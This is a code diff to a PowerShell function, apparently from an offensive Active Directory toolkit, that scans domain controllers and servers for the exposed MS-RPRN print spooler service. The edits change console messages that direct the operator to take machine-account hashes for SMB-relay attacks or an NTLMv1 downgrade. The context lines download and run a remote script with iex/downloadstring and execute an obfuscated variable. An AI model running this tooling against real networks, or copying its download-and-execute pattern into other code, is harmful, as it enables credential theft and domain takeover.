@@ -2550,7 +2550,7 @@ function Spoolvulnscan
     if (!$exploit)
     {   
         IEX ($viewdevobfs)         
-	    Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
+	    Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service!' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
         iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/SpoolerScanner/master/SpoolerScan.ps1')
         $domcontrols = spinster
         
@@ -2561,7 +2561,7 @@ function Spoolvulnscan
 		   	try{
                    if (spoolscan -target $domc)
                    {
-                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
+                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now / or maybe NTLMv1 downgrade (https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)'
                             if(!$consoleoutput){echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"}else{Write-Host -ForegroundColor Red "$domc is vulnerable"}
                    }
 			   }
@@ -2584,7 +2584,7 @@ function Spoolvulnscan
 				    try{
                         	if (spoolscan -target $acserver)
                         	{
-                            		Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now"
+                            		Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. You can take the Computer-Account Hash for SMB-Relay attacks / or maybe NTLMv1 downgrade (https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)"
                             		if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"}else{Write-Host "$acserver is vulnerable";$servers += $acserver}
                         	}
 				        }catch{Write-Host "Got an error"}
